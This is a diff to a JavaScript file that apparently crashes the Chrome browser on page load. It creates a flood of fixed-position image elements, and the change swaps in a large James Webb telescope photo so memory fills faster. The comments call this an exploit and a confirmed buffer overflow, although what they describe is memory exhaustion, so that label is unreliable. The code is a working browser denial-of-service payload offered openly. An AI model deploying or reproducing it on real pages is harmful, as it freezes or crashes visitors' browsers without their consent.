@@ -25,6 +25,13 @@
 
 // IT CRASHES CHROME!! NICE!!!
 
+// Checked resource monitor, confirmed buffer overflow!
+
+// Started testing with a few different versions (sizes) of the
+// Stephan's Quintet photo from the James Webb Space Telescope,
+// it appears larger images cause the ram to leak much quicker (which makes sense)
+// so I figured I'd add some larger images for testing purposes
+
 window.onload = () => {
 
     // variable to control the intensity of the exploit
@@ -33,7 +40,7 @@ window.onload = () => {
 
     // payload to overflow the buffer with
     let payloadStyles = `position: fixed;`;
-    let payload = `<img src="img/egg.jpeg" alt="eg" style="${payloadStyles}">`;
+    let payload = `<img src="img/stephans-quintet-jwst_large.jpeg" alt="eg" style="${payloadStyles}">`;
 
     // make way too many fixed elements 
     let fixedOverflow = (amt) => {
